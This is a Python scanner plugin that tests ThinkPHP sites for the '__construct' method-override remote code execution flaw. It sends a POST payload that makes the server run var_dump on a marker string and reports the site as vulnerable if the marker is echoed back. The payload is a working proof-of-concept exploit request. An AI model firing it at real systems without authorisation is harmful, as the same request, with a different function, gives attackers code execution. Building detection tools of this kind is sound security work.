"""  
@Time: 2024/2/28 16:10 
@Auth: Y5neKO
@File: Thinkphp_index_construct_rce.py 
@IDE: PyCharm 
"""
import urllib
import requests


def run(url, timeout):
    result = {
        'name': 'Thinkphp_index_construct_rce',
        'vulnerable': False,
        'method': None,
        'url': None,
        'position': None,
        'payload': None
    }
    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = 's=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=var_dump'
    try:
        vurl = url + '/index.php?s=index/index/index'
        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False)
        if r"4e5e5d7364f443e28fbf0d3ae744a59a" in req.text and 'var_dump' not in req.text:
            result['vulnerable'] = True
            result['method'] = 'POST'
            result['url'] = vurl
            result['position'] = 'data'
            result['payload'] = payload
    except Exception as e:
        print(f"发生错误：{e}")

    return result
